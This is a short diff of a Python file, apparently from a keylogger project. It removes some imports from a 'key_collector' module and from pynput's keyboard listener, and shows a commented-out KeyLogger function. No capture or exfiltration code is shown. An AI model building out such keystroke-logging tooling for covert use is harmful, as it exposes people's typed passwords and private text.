@@ -1,5 +1,5 @@
-from key_collector import on_press, on_release, write_file, log_dict, pressed_keys
-from pynput.keyboard import Key, Listener
+from key_collector import on_press, on_release
+from pynput.keyboard import Listener
 
 # def KeyLogger(listener):
 #     # on_press(listener)
